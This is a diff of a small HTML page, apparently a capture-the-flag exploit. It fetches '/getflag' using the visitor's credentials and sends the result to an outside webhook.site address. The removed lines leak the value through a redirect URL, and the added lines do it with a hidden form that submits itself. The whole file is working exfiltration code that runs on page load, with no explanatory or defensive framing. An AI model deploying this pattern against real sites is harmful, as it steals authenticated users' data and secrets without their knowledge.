@@ -1,14 +1,17 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <form action="https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a" method="POST">
+      <input type="hidden" name="flag" id="flag">
+    </form>
+
     <script>
-      fetch('/getflag', { credentials: 'include' })
-      .then(res => res.text())
-      .then(flag => {
-      location = 'https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a?leak=' + encodeURIComponent(flag);
-      });
+      fetch("/getflag", { credentials: "include" })
+        .then(res => res.text())
+        .then(flag => {
+          document.getElementById("flag").value = flag;
+          document.forms[0].submit();
+        });
     </script>
-
-
   </body>
 </html>
